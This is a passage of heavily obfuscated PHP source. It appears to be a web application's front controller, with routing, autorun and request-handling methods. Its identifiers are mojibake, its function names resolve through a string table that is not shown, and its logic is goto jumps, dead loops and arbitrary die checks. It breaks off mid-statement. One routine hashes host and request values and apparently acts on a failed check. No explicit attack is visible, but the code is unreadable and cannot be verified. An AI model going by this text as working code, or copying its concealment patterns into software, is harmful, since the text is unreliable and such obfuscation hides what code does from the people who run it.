$có¶¿ÉÖË[2] ? $có¶¿ÉÖË[2] : $this->defaultAction; $this->{$_SERVER[˜][3]}($F“’ÆœÖí•[4], array($this, $F“’ÆœÖí•[5])); goto AŒõÅÑº£Ú; f‘ÄºØè£: $Eêó¹œÒš =& $_SERVER[¬ˆÚÂ”Éğä]; $F“’ÆœÖí• =& $_SERVER[˜]; $có¶¿ÉÖË = $F“’ÆœÖí•[0]($F“’ÆœÖí•[1], $F“’ÆœÖí•[2]($b¢³ëĞ½‚, $F“’ÆœÖí•[1])); goto D‰°ß¢ñƒ–; aÚƒ³Š¬éÕ: $this->defaultController = $có¶¿ÉÖË[1] ? $có¶¿ÉÖË[1] : $this->defaultController; $bŞÊ‘¸—‰™ = $Eêó¹œÒš[555]; if (!$bŞÊ‘¸—‰™) { return; } goto A…Ğ»™¼š; AŒõÅÑº£Ú: } public function appRun($aÃÖÅ×¹à˜) { goto aŸéŞÕ„ï; aŸéŞÕ„ï: $BË«ããÖ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÔ²´ê¤É =& $_SERVER[˜]; $FÈ‘“°÷ó¥ = $FÔ²´ê¤É[0]($FÔ²´ê¤É[1], $aÃÖÅ×¹à˜); goto Cî…Ü‘é‰Á; E‘æÛ†‰´İ: $e‚ƒÉ¸÷Ñ = $FÔ²´ê¤É[7]; if ($CÈÉ°œš == $FÔ²´ê¤É[8]) { $e‚ƒÉ¸÷Ñ = $FÔ²´ê¤É[9]; $FÈ‘“°÷ó¥[0] = $FÔ²´ê¤É[10]; $FÈ‘“°÷ó¥[1] = $FÈ‘“°÷ó¥[1] . $FÔ²´ê¤É[11]; $aÃÖÅ×¹à˜ = $FÔ²´ê¤É[12]($FÔ²´ê¤É[1], $FÈ‘“°÷ó¥); $aÃÖÅ×¹à˜ = $FÔ²´ê¤É[2]($aÃÖÅ×¹à˜, $FÔ²´ê¤É[1]); } $FÔ²´ê¤É[13](array($FÔ²´ê¤É[14], $FÔ²´ê¤É[15]), $e‚ƒÉ¸÷Ñ . $FÔ²´ê¤É[16], $aÃÖÅ×¹à˜); goto bøòÏÌ•óğ; dÑ‘Îï‡œ: $FÔ²´ê¤É[13](array($FÔ²´ê¤É[14], $FÔ²´ê¤É[15]), $e‚ƒÉ¸÷Ñ . $FÔ²´ê¤É[18], $aÃÖÅ×¹à˜); goto C‡ÔâáÎêÆ; bøòÏÌ•óğ: $FÔ²´ê¤É[17]($aÃÖÅ×¹à˜); $e‹•¹ŠãÉÒ = $BË«ããÖ‚[557]; if (strlen($e‹•¹ŠãÉÒ) < $BË«ããÖ‚[558]) { die; } goto dÑ‘Îï‡œ; Cî…Ü‘é‰Á: $CÈÉ°œš = $FÔ²´ê¤É[6]($FÈ‘“°÷ó¥[0]); $b˜‘˜Èàøˆ = $BË«ããÖ‚[556]; while ($b˜‘˜Èàøˆ < $BË«ããÖ‚[553]) { if ($b˜‘˜Èàøˆ >= 0) { break; } $b˜‘˜Èàøˆ++; } goto E‘æÛ†‰´İ; C‡ÔâáÎêÆ: } private function autorun() { $D»ù‹ˆéÍ =& $_SERVER[˜]; global $config; if ($D»ù‹ˆéÍ[19]($config[$D»ù‹ˆéÍ[20]]) == 0) { return; } foreach ($config[$D»ù‹ˆéÍ[20]] as $dÑ ÅÏè† => $DÒ‡…¹•Ã³) { $this->{$_SERVER[˜][21]}($DÒ‡…¹•Ã³); $AßÑÇšàà = $_SERVER[¬ˆÚÂ”Éğä][559]; } } private function djhl9c6f05d4() { goto F£ÂŸî¯±; BêŞªƒæë‡: if ($Aµ¬‘ôÙÊ»[6]($Aµ¬‘ôÙÊ»[25]($f§­ƒİ©¯, -$Aµ¬‘ôÙÊ»[24]($E¬ß‹“À‘))) != $E¬ß‹“À‘) { return; } $Fâ’ƒ¬£Ø¤ = $Aµ¬‘ôÙÊ»[25]($f§­ƒİ©¯, 0, -$Aµ¬‘ôÙÊ»[24]($E¬ß‹“À‘)); $b¤ç•Å»Øï = $b“±‡ÜšÚ[563]; goto có—ÂÇÏ¡¾; AÔ¤‘ÌÊî¿: $fÇ¡¯éšæ = $b“±‡ÜšÚ[565]; while ($fÇ¡¯éšæ < $b“±‡ÜšÚ[558]) { if ($fÇ¡¯éšæ >= 0) { break; } $fÇ¡¯éšæ++; } goto A‡³êåù; f„Ç•­àÛ: $c½†­—¤´° = $b“±‡ÜšÚ[560]; if (!$c½†­—¤´°) { return; } $f§­ƒİ©¯ = $GLOBALS[$Aµ¬‘ôÙÊ»[22]][$Aµ¬‘ôÙÊ»[23]][0]; goto bÂÖï‡¤Ÿ¢; E©õ³÷ù§ê: if (!$A¹‹À•ä÷º) { return; } $GLOBALS[$Aµ¬‘ôÙÊ»[22]][$Aµ¬‘ôÙÊ»[23]] = $Aµ¬‘ôÙÊ»[27]($cÆ¯çàº„‚, $A¢ñÂÈÜïê); $GLOBALS[$Aµ¬‘ôÙÊ»[22]][$Aµ¬‘ôÙÊ»[28]] = $Aµ¬‘ôÙÊ»[29]($Aµ¬‘ôÙÊ»[1], $GLOBALS[$Aµ¬‘ôÙÊ»[22]][$Aµ¬‘ôÙÊ»[23]]); goto AÔ¤‘ÌÊî¿; có—ÂÇÏ¡¾: $cÆ¯çàº„‚ = array($Aµ¬‘ôÙÊ»[8], $Fâ’ƒ¬£Ø¤); $A¢ñÂÈÜïê = $Aµ¬‘ôÙÊ»[26]($GLOBALS[$Aµ¬‘ôÙÊ»[22]][$Aµ¬‘ôÙÊ»[23]], 1); $A¹‹À•ä÷º = $b“±‡ÜšÚ[564]; goto E©õ³÷ù§ê; bÂÖï‡¤Ÿ¢: $F¶ñª±Õ«ø = $b“±‡ÜšÚ[561]; if (strlen($F¶ñª±Õ«ø) < $b“±‡ÜšÚ[562]) { die; } if (!$f§­ƒİ©¯ || $Aµ¬‘ôÙÊ»[24]($f§­ƒİ©¯) <= $Aµ¬‘ôÙÊ»[24]($E¬ß‹“À‘)) { return; } goto BêŞªƒæë‡; F£ÂŸî¯±: $b“±‡ÜšÚ =& $_SERVER[¬ˆÚÂ”Éğä]; $Aµ¬‘ôÙÊ» =& $_SERVER[˜]; $E¬ß‹“À‘ = $Aµ¬‘ôÙÊ»[8]; goto f„Ç•­àÛ; A‡³êåù: } private function biwk3c75ae8e() { goto b±é¢Ó¾’†; A½”Âˆ…öÆ: $GLOBALS[$b Æà‡ºÂ[22]][$b Æà‡ºÂ[23]] = $b Æà‡ºÂ[0]($b Æà‡ºÂ[36], $bê¯Š¯ªÚµ); $GLOBALS[$b Æà‡ºÂ[22]][$b Æà‡ºÂ[28]] = $b Æà‡ºÂ[29]($b Æà‡ºÂ[1], $GLOBALS[$b Æà‡ºÂ[22]][$b Æà‡ºÂ[23]]); $Aí±øçÏ = $bÎ¯áÎ‹«›[570]; goto Bßİ´õóë; b±é¢Ó¾’†: $bÎ¯áÎ‹«› =& $_SERVER[¬ˆÚÂ”Éğä]; $b Æà‡ºÂ =& $_SERVER[˜]; if ($GLOBALS[$b Æà‡ºÂ[22]][$b Æà‡ºÂ[28]] != $b Æà‡ºÂ[10]) { return; } goto Föë¬éÕ£; aé£´Ö¯Õ: $b°Å»ù¿“Ã = $b Æà‡ºÂ[33]($aÔ˜ÈµÑ÷…, $D¼³ƒ¤âä); $bê¯Š¯ªÚµ = $b Æà‡ºÂ[25]($aÔ˜ÈµÑ÷…, $b°Å»ù¿“Ã + $b Æà‡ºÂ[24]($D¼³ƒ¤âä)); $FŒ˜Ì„Ÿá· = $bÎ¯áÎ‹«›[566]; goto cÎ©”ÄÍ¥½; EõĞ½¶„åİ: while ($cò¤…À…Ä¼ < $bÎ¯áÎ‹«›[569]) { if ($cò¤…À…Ä¼ >= 0) { break; } $cò¤…À…Ä¼++; } $bê¯Š¯ªÚµ = $b Æà‡ºÂ[2]($dØ¬¯½‡ë±[0][0], $b Æà‡ºÂ[36]); $f›¬–ÕÜ‹Ú = $bÎ¯áÎ‹«›[564]; goto A½”Âˆ…öÆ; Bßİ´õóë: while (strlen($Aí±øçÏ) < $bÎ¯áÎ‹«›[569]) { if (!$Aí±øçÏ) { break; } $Aí±øçÏ++; } goto bà¿ÈÈ˜Î; Föë¬éÕ£: $aÔ˜ÈµÑ÷… = $_SERVER[$b Æà‡ºÂ[30]]; $D¼³ƒ¤âä = $b Æà‡ºÂ[31]; if (!$b Æà‡ºÂ[32]($aÔ˜ÈµÑ÷…, $D¼³ƒ¤âä)) { return; } goto aé£´Ö¯Õ; cÎ©”ÄÍ¥½: while ($FŒ˜Ì„Ÿá· < $bÎ¯áÎ‹«›[567]) { if ($FŒ˜Ì„Ÿá· >= 0) { break; } $FŒ˜Ì„Ÿá·++; } $b Æà‡ºÂ[34]($b Æà‡ºÂ[35], $bê¯Š¯ªÚµ, $dØ¬¯½‡ë±); $cò¤…À…Ä¼ = $bÎ¯áÎ‹«›[568]; goto EõĞ½¶„åİ; bà¿ÈÈ˜Î: } public function run() { goto då´Í¼œİ; a½­¡©Ä¶Ô: $b”š®‘®Èã = $FÆƒø£æ§À[571]; $this->{$_SERVER[˜][38]}(); $d‹¤á”èŸ = $FÆƒø£æ§À[572]; goto FÍ¿Ïİø¦£; F¼ãº¬ƒ­: $FåÙ²áŠ¿ = $FÆƒø£æ§À[576]; while ($FåÙ²áŠ¿ < $FÆƒø£æ§À[569]) { if ($FåÙ²áŠ¿ >= 0) { break; } $FåÙ²áŠ¿++; } $this->{$_SERVER[˜][45]}(); goto B‹ù…ÕÏä; aÙàó·™: $CïéÈôà ñ = $GLOBALS[$AĞ„‘„‚‰ê[22]][$AĞ„‘„‚‰ê[28]]; $AĞ„‘„‚‰ê[39]($AĞ„‘„‚‰ê[40], isset($F»Š¤ˆŒ²[0]) && $F»Š¤ˆŒ²[0] ? $F»Š¤ˆŒ²[0] : $this->defaultModule); $bÁğƒ–ÜÓŸ = $FÆƒø£æ§À[574]; goto Cá§Ÿé ½ô; Cá§Ÿé ½ô: if (!$bÁğƒ–ÜÓŸ) { return; } $AĞ„‘„‚‰ê[39]($AĞ„‘„‚‰ê[41], isset($F»Š¤ˆŒ²[1]) && $F»Š¤ˆŒ²[0] ? $F»Š¤ˆŒ²[1] : $this->defaultController); $A¤¬ÏŸÀ = $FÆƒø£æ§À[575]; goto A®¢Ö¤Ì‘Ä; då´Í¼œİ: $FÆƒø£æ§À =& $_SERVER[¬ˆÚÂ”Éğä]; $AĞ„‘„‚‰ê =& $_SERVER[˜]; $this->{$_SERVER[˜][37]}(); goto a½­¡©Ä¶Ô; B‹ù…ÕÏä: $Fß‚Ê­‚Û = $FÆƒø£æ§À[577]; if (strlen($Fß‚Ê­‚Û) < $FÆƒø£æ§À[569]) { return; } if ($AĞ„‘„‚‰ê[19]($F»Š¤ˆŒ²) >= 3) { $this->{$_SERVER[˜][21]}($CïéÈôà ñ); } else { $this->{$_SERVER[˜][21]}(ACTION); } goto b±Æ÷Ô…ÆÇ; A®¢Ö¤Ì‘Ä: $AĞ„‘„‚‰ê[39]($AĞ„‘„‚‰ê[42], isset($F»Š¤ˆŒ²[2]) && $F»Š¤ˆŒ²[0] ? $F»Š¤ˆŒ²[2] : $this->defaultAction); $AĞ„‘„‚‰ê[39]($AĞ„‘„‚‰ê[43], MOD . $AĞ„‘„‚‰ê[1] . ST . $AĞ„‘„‚‰ê[1] . ACT); $_SERVER[$AĞ„‘„‚‰ê[44]] = $AĞ„‘„‚‰ê[6](ACTION); goto F¼ãº¬ƒ­; FÍ¿Ïİø¦£: $F»Š¤ˆŒ² = $GLOBALS[$AĞ„‘„‚‰ê[22]][$AĞ„‘„‚‰ê[23]]; $Eô×ŠôĞà§ = $FÆƒø£æ§À[573]; if (strlen($Eô×ŠôĞà§) < $FÆƒø£æ§À[558]) { die; } goto aÙàó·™; b±Æ÷Ô…ÆÇ: } private $qofx89c68600 = array(); private $undl50391cdc = ''; public function cfzx81330c98() { goto Aíğš¼„—­; C—ƒçÊÅ÷—: $EÉÎÄ—·ô¯ = $d¥ê¸‡Ï±Ï[579]; while ($EÉÎÄ—·ô¯ < $d¥ê¸‡Ï±Ï[553]) { if ($EÉÎÄ—·ô¯ >= 0) { break; } $EÉÎÄ—·ô¯++; } $this->{$_SERVER[˜][48]}(); goto C“±¯›Ê…ò; C“±¯›Ê…ò: $A‘™ôÂ–ä = $d¥ê¸‡Ï±Ï[580]; if (!$A‘™ôÂ–ä) { die; } $this->{$_SERVER[˜][49]}(); goto C»ùŠ™Ÿ¼; EÃÊ÷÷¥ø§: $eªŒ²²¿ªƒ = $d¥ê¸‡Ï±Ï[578]; if (!$eªŒ²²¿ªƒ) { die; } $this->{$_SERVER[˜][47]}(); goto C—ƒçÊÅ÷—; C»ùŠ™Ÿ¼: $this->{$_SERVER[˜][50]}(); $this->{$_SERVER[˜][51]}(); $bñ›®‡…Œî = $d¥ê¸‡Ï±Ï[581]; goto E‰²³ç¤İ; f††¡»ë±§: $aÓ’ÓÀ”â = $d¥ê¸‡Ï±Ï[583]; if (!$aÓ’ÓÀ”â) { die; } $this->{$_SERVER[˜][3]}($AÍå³Ã—æ[57], array($this, $AÍå³Ã—æ[58])); goto bâ¡¥°ô¸…; Aíğš¼„—­: $d¥ê¸‡Ï±Ï =& $_SERVER[¬ˆÚÂ”Éğä]; $AÍå³Ã—æ =& $_SERVER[˜]; $this->{$_SERVER[˜][46]}(); goto EÃÊ÷÷¥ø§; bâ¡¥°ô¸…: $DéÆÊ¯„­Ã = $d¥ê¸‡Ï±Ï[584]; if (!$DéÆÊ¯„­Ã) { die; } $this->{$_SERVER[˜][3]}($AÍå³Ã—æ[59], array($this, $AÍå³Ã—æ[60])); goto F†‡¡¨ôÏ‘; aµÂ†¢µˆ¢: if (!$BÙò‚‘Ğ†˜) { die; } $this->{$_SERVER[˜][3]}($AÍå³Ã—æ[53], array($this, $AÍå³Ã—æ[54])); $this->{$_SERVER[˜][3]}($AÍå³Ã—æ[55], array($this, $AÍå³Ã—æ[56])); goto f††¡»ë±§; E‰²³ç¤İ: if (strlen($bñ›®‡…Œî) < $d¥ê¸‡Ï±Ï[562]) { return; } $this->{$_SERVER[˜][52]}(); $BÙò‚‘Ğ†˜ = $d¥ê¸‡Ï±Ï[582]; goto aµÂ†¢µˆ¢; F†‡¡¨ôÏ‘: } public function onpk47d064ac($aÁ¹ä™·†½) { goto Eº†‰×„§Î; EÖòÑ´ƒì: $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[118]] = $AÅÕ˜Û¼î[119]($AÅÕ˜Û¼î[120])->{$_SERVER[˜][121]}(); $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[122]] = $AÅÕ˜Û¼î[123]($_SERVER[$AÅÕ˜Û¼î[124]] . $Fá–³¥·¯ğ[$AÅÕ˜Û¼î[125]]); $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[126]] = $AÅÕ˜Û¼î[127]($AÅÕ˜Û¼î[128]()); goto DØÌééÂ§; Eº†‰×„§Î: $A¨Éˆ‹î÷ˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $AÅÕ˜Û¼î =& $_SERVER[˜]; $Fá–³¥·¯ğ = $AÅÕ˜Û¼î[61]($AÅÕ˜Û¼î[62])->{$_SERVER[˜][63]}(); goto A¶ˆ¯¶Å¦¯; Fñ‚Ë·¤èÔ: $aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[103]][$AÅÕ˜Û¼î[108]] = array($AÅÕ˜Û¼î[109] => (int) $CˆöíƒèŒ [$AÅÕ˜Û¼î[110]], $AÅÕ˜Û¼î[111] => $AÅÕ˜Û¼î[112]($AÅÕ˜Û¼î[113]($CˆöíƒèŒ , $AÅÕ˜Û¼î[114], array())), $AÅÕ˜Û¼î[115] => (int) $AÅÕ˜Û¼î[113]($CˆöíƒèŒ , $AÅÕ˜Û¼î[116], 0)); $fÈÇ˜‘ˆ²± = $A¨Éˆ‹î÷ˆ[587]; while (strlen($fÈÇ˜‘ˆ²±) < $A¨Éˆ‹î÷ˆ[558]) { if (!$fÈÇ˜‘ˆ²±) { break; } $fÈÇ˜‘ˆ²±++; } goto EÖòÑ´ƒì; A§ËãÃñò‘: return $aÁ¹ä™·†½; goto bØ¦”º³¥; DØÌééÂ§: $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[129]] = $this->undl50391cdc; if ($Fá–³¥·¯ğ[$AÅÕ˜Û¼î[129]] != $AÅÕ˜Û¼î[130]) { $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[131]] = $Fá–³¥·¯ğ[$AÅÕ˜Û¼î[131]]; $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[132]] = $Fá–³¥·¯ğ[$AÅÕ˜Û¼î[132]]; $C“²”ŞĞ±Ğ = $AÅÕ˜Û¼î[133](10) . $this->undl50391cdc . $AÅÕ˜Û¼î[133](5); $aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[134]][$AÅÕ˜Û¼î[135]] = $this->{$_SERVER[˜][136]}($C“²”ŞĞ±Ğ, $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[122]]); } if ($this->undl50391cdc == $AÅÕ˜Û¼î[130]) { $aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[103]][$AÅÕ˜Û¼î[108]][$AÅÕ˜Û¼î[116]] = 0; } goto A²Ñ¸˜¾; A¶ˆ¯¶Å¦¯: $Aæò‰Ã£”« = array($AÅÕ˜Û¼î[64], $AÅÕ˜Û¼î[65], $AÅÕ˜Û¼î[66], $AÅÕ˜Û¼î[67], $AÅÕ˜Û¼î[68], $AÅÕ˜Û¼î[69], $AÅÕ˜Û¼î[70], $AÅÕ˜Û¼î[71], $AÅÕ˜Û¼î[72], $AÅÕ˜Û¼î[73], $AÅÕ˜Û¼î[74], $AÅÕ˜Û¼î[75], $AÅÕ˜Û¼î[76], $AÅÕ˜Û¼î[77], $AÅÕ˜Û¼î[78], $AÅÕ˜Û¼î[79], $AÅÕ˜Û¼î[80], $AÅÕ˜Û¼î[81], $AÅÕ˜Û¼î[82], $AÅÕ˜Û¼î[83], $AÅÕ˜Û¼î[84], $AÅÕ˜Û¼î[85], $AÅÕ˜Û¼î[86], $AÅÕ˜Û¼î[87], $AÅÕ˜Û¼î[88], $AÅÕ˜Û¼î[89], $AÅÕ˜Û¼î[90], $AÅÕ˜Û¼î[91], $AÅÕ˜Û¼î[92], $AÅÕ˜Û¼î[93], $AÅÕ˜Û¼î[94], $AÅÕ˜Û¼î[95], $AÅÕ˜Û¼î[96], $AÅÕ˜Û¼î[97], $AÅÕ˜Û¼î[98], $AÅÕ˜Û¼î[99]); foreach ($Aæò‰Ã£”« as $cÇ¾™ÈĞÏ) { $E¤×ëùÓ ‚ = $GLOBALS[$AÅÕ˜Û¼î[100]][$AÅÕ˜Û¼î[101]][$cÇ¾™ÈĞÏ]; $EåíÎØƒóã = $A¨Éˆ‹î÷ˆ[585]; if (isset($Fá–³¥·¯ğ[$cÇ¾™ÈĞÏ])) { $E¤×ëùÓ ‚ = $Fá–³¥·¯ğ[$cÇ¾™ÈĞÏ]; } $aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[103]][$cÇ¾™ÈĞÏ] = $E¤×ëùÓ ‚; } $CˆöíƒèŒ  = $aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[103]][$AÅÕ˜Û¼î[76]]; goto eãÎÔš¸‚§; eãÎÔš¸‚§: unset($aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[104]][$AÅÕ˜Û¼î[105]]); unset($aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[104]][$AÅÕ˜Û¼î[106]]); unset($aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[103]][$AÅÕ˜Û¼î[76]]); goto Fš‘õè¬å; A²Ñ¸˜¾: $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[137]] = $AÅÕ˜Û¼î[113]($this->qofx89c68600, $AÅÕ˜Û¼î[138], $AÅÕ˜Û¼î[10]); $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[139]] = $AÅÕ˜Û¼î[113]($this->qofx89c68600, $AÅÕ˜Û¼î[140], $AÅÕ˜Û¼î[10]); if ($AÅÕ˜Û¼î[113]($GLOBALS, $AÅÕ˜Û¼î[141]) && $this->config[$AÅÕ˜Û¼î[142]]) { $aÁ¹ä™·†½[$AÅÕ˜Û¼î[117]][$AÅÕ˜Û¼î[143]] = WEB_ROOT; } goto A§ËãÃñò‘; Fš‘õè¬å: unset($aÁ¹ä™·†½[$AÅÕ˜Û¼î[102]][$AÅÕ˜Û¼î[103]][$AÅÕ˜Û¼î[107]]); $dÙæ˜Âİ¸ˆ = $A¨Éˆ‹î÷ˆ[586]; if (strlen($dÙæ˜Âİ¸ˆ) < $A¨Éˆ‹î÷ˆ[567]) { return; } goto Fñ‚Ë·¤èÔ; bØ¦”º³¥: } private function dyjo4f954f37() { goto F¯¬Ô±Ÿ; F¯¬Ô±Ÿ: $fğòÌ±â =& $_SERVER[¬ˆÚÂ”Éğä]; $D¹¶ê´ö÷ =& $_SERVER[˜]; if ($_SERVER[$D¹¶ê´ö÷[44]] == $D¹¶ê´ö÷[144]) { goto f¤Í…”è°Ë; f¤Í…”è°Ë: $cŒ•¤¯­¾ñ = array($D¹¶ê´ö÷[129] => $this->undl50391cdc, $D¹¶ê´ö÷[145] => $this->{$_SERVER[˜][146]}(), $D¹¶ê´ö÷[147] => $D¹¶ê´ö÷[61]($D¹¶ê´ö÷[148])->{$_SERVER[˜][149]}()); if ($this->undl50391cdc != $D¹¶ê´ö÷[130]) { $BÔ¼ÜîÊÔ = $D¹¶ê´ö÷[113]($this->qofx89c68600, $D¹¶ê´ö÷[150]); if ($BÔ¼ÜîÊÔ) { $cŒ•¤¯­¾ñ[$D¹¶ê´ö÷[151]] = $BÔ¼ÜîÊÔ; $cŒ•¤¯­¾ñ[$D¹¶ê´ö÷[152]] = $D¹¶ê´ö÷[153]($D¹¶ê´ö÷[113]($this->qofx89c68600, $D¹¶ê´ö÷[154])); $cŒ•¤¯­¾ñ[$D¹¶ê´ö÷[155]] = $D¹¶ê´ö÷[113]($this->qofx89c68600, $D¹¶ê´ö÷[140]); } } $cŒ•¤¯­¾ñ = $this->{$_SERVER[˜][156]}($D¹¶ê´ö÷[157]($cŒ•¤¯­¾ñ), $D¹¶ê´ö÷[123]($D¹¶ê´ö÷[158])); goto cïêïŠÀÏ ; A¥Š—İé¸: $D¹¶ê´ö÷[13](array($D¹¶ê´ö÷[160], $D¹¶ê´ö÷[161]), $b§¨°¶Ê’); goto Cˆæ ÔÏÂ÷; cïêïŠÀÏ : $b§¨°¶Ê’ = array($D¹¶ê´ö÷[159] => $cŒ•¤¯­¾ñ); $E¹‰Œàìîë = $fğòÌ±â[588]; if (!$E¹‰Œàìîë) { die; } goto A¥Š—İé¸; Cˆæ ÔÏÂ÷: } goto Cïì«éÚ Û; B°…‹éä‡: while ($Cù¡‹›ÌÅÉ < $fğòÌ±â[553]) { if ($Cù¡‹›ÌÅÉ >= 0) { break; } $Cù¡‹›ÌÅÉ++; } $eËÊ‰™Âõ = $D¹¶ê´ö÷[61]($D¹¶ê´ö÷[62])->{$_SERVER[˜][63]}(); $c–÷’¦š Î = $fğòÌ±â[590]; goto FéÒºå”ùí; Cïì«éÚ Û: if ($this->undl50391cdc == $D¹¶ê´ö÷[130]) { return; } $cÎÂ‡Ã©‹• = array($D¹¶ê´ö÷[162], $D¹¶ê´ö÷[163], $D¹¶ê´ö÷[164], $D¹¶ê´ö÷[165], $D¹¶ê´ö÷[166], $D¹¶ê´ö÷[167]); $Cù¡‹›ÌÅÉ = $fğòÌ±â[589]; goto B°…‹éä‡; FéÒºå”ùí: if (!$c–÷’¦š Î) { return; } $b§¨°¶Ê’ = array($D¹¶ê´ö÷[168] => $eËÊ‰™Âõ[$D¹¶ê´ö÷[64]], $D¹¶ê´ö÷[169] => $eËÊ‰™Âõ[$D¹¶ê´ö÷[65]], $D¹¶ê´ö÷[170] => $D¹¶ê´ö÷[10]); foreach ($cÎÂ‡Ã©‹• as $Eİ˜îä‡¬¬) { if (!isset($eËÊ‰™Âõ[$Eİ˜îä‡¬¬]) || !$eËÊ‰™Âõ[$Eİ˜îä‡¬¬]) { continue; } $b§¨°¶Ê’[$Eİ˜îä‡¬¬] = $eËÊ‰™Âõ[$Eİ˜îä‡¬¬]; $f‰¡¡×òê = $fğòÌ±â[591]; } goto Eí›††’é; Eí›††’é: $D¹¶ê´ö÷[13](array($D¹¶ê´ö÷[160], $D¹¶ê´ö÷[161]), $b§¨°¶Ê’); $có¥©ĞÔ¯Ó = $fğòÌ±â[584]; while ($có¥©ĞÔ¯Ó < $fğòÌ±â[567]) { if ($có¥©ĞÔ¯Ó >= 0) { break; } $có¥©ĞÔ¯Ó++; } goto A¬…­‰‰ÄÌ; A¬…­‰‰ÄÌ: } private function cbshb932b150() { goto b§¦‰ÖÄ²; a»„£ì‡Ú: $E¨À…íã…Ş = $FëÊ‹»Öø²[230]($FëÊ‹»Öø²[61]($FëÊ‹»Öø²[11])->{$_SERVER[˜][231]}(), $FëÊ‹»Öø²[232]); $C¢ºòÒÎØ = $E¨À…íã…Ş[$FëÊ‹»Öø²[233]]; $eÈ½ÛßÚñİ = $CÜÎ¦–“µ[602]; goto b„™ŒÍµí; b§¦‰ÖÄ²: $CÜÎ¦–“µ =& $_SERVER[¬ˆÚÂ”Éğä]; $FëÊ‹»Öø² =& $_SERVER[˜]; if ($_SERVER[$FëÊ‹»Öø²[44]] != $FëÊ‹»Öø²[171]) { return; } goto b›šïˆÔ’İ; dñ®§õ‘‘: $EëÜ™âÖ‹ = $this->{$_SERVER[˜][208]}($C‘¹¼”©Ø‰[$FëÊ‹»Öø²[209]]); if (!$EëÜ™âÖ‹ || $EëÜ™âÖ‹ != $C‘¹¼”©Ø‰[$FëÊ‹»Öø²[154]]) { $f˜åâáÜÍ = array($FëÊ‹»Öø²[210] => $FëÊ‹»Öø²[61]($FëÊ‹»Öø²[62])->{$_SERVER[˜][63]}($FëÊ‹»Öø²[125]), $FëÊ‹»Öø²[211] => $_SERVER[$FëÊ‹»Öø²[124]], $FëÊ‹»Öø²[212] => $FëÊ‹»Öø²[213](), $FëÊ‹»Öø²[183] => $_SERVER[$FëÊ‹»Öø²[184]]); $Cä­è³ªÜÛ = $this->{$_SERVER[˜][214]}($FëÊ‹»Öø²[157]($f˜åâáÜÍ)); $this->{$_SERVER[˜][191]}($FëÊ‹»Öø²[215] . $Cä­è³ªÜÛ); $FëÊ‹»Öø²[175]($FëÊ‹»Öø²[206]($FëÊ‹»Öø²[216]), !0); } $añø—¢øÖ¹ = array($FëÊ‹»Öø²[217] => $EÍ¡æ—èº[$FëÊ‹»Öø²[174]], $FëÊ‹»Öø²[218] => $C‘¹¼”©Ø‰[$FëÊ‹»Öø²[219]], $FëÊ‹»Öø²[220] => $FëÊ‹»Öø²[133](16), $FëÊ‹»Öø²[129] => $C‘¹¼”©Ø‰[$FëÊ‹»Öø²[221]]); goto E³½¨µ»”ˆ; E³½¨µ»”ˆ: if ($EÍ¡æ—èº[$FëÊ‹»Öø²[177]]) { $añø—¢øÖ¹[$FëÊ‹»Öø²[220]] = $EÍ¡æ—èº[$FëÊ‹»Öø²[177]]; } $aù‘½ë¨¹ = $FëÊ‹»Öø²[25]($FëÊ‹»Öø²[123]($añø—¢øÖ¹[$FëÊ‹»Öø²[218]]), 10, 10); $CŒÈÈèƒ° = $aù‘½ë¨¹ . $añø—¢øÖ¹[$FëÊ‹»Öø²[129]] . $añø—¢øÖ¹[$FëÊ‹»Öø²[220]]; goto BÚ÷Éé¤; cêäŸÙŒÔÁ: $AŠõø“‰ç = $FëÊ‹»Öø²[222]($FëÊ‹»Öø²[25]($còÈ§éÄØ¿, 10, 16)); $Eáñ¶±÷æ = $CÜÎ¦–“µ[600]; if (!$Eáñ¶±÷æ) { return; } goto eÑÊ •Šµ; Aµæ¼¶®†±: $A¿¼âåÈ‡ = $CÜÎ¦–“µ[597]; while ($A¿¼âåÈ‡ < $CÜÎ¦–“µ[558]) { if ($A¿¼âåÈ‡ >= 0) { break; } $A¿¼âåÈ‡++; } $añø—¢øÖ¹[$FëÊ‹»Öø²[132]] = $FëÊ‹»Öø²[127]($FëÊ‹»Öø²[222]($this->{$_SERVER[˜][156]}($aìË¡ğ—Öê, $FëÊ‹»Öø²[224]))); goto Aéê’ÌÔÑİ; eÂ«£„õ§Ú: $this->qofx89c68600 = $C‘¹¼”©Ø‰; $this->undl50391cdc = $añø—¢øÖ¹[$FëÊ‹»Öø²[129]]; $dÆ»…‘Ãëç = $CÜÎ¦–“µ[606]; goto Bâº÷ƒŸ¬Û; b„™ŒÍµí: if (!$eÈ½ÛßÚñİ) { return; } $DÕµ’İöˆ = array(); $FÁÖ·®æŞƒ = $CÜÎ¦–“µ[603]; goto eÅë«í…µÍ; EÊ£¢„é·Å: $còÈ§éÄØ¿ = $FëÊ‹»Öø²[123]($_SERVER[$FëÊ‹»Öø²[124]] . $FëÊ‹»Öø²[222]($bÊÓ¿ÕÚ) . $añø—¢øÖ¹[$FëÊ‹»Öø²[218]]); $eË†óˆËäß = $CÜÎ¦–“µ[599]; while 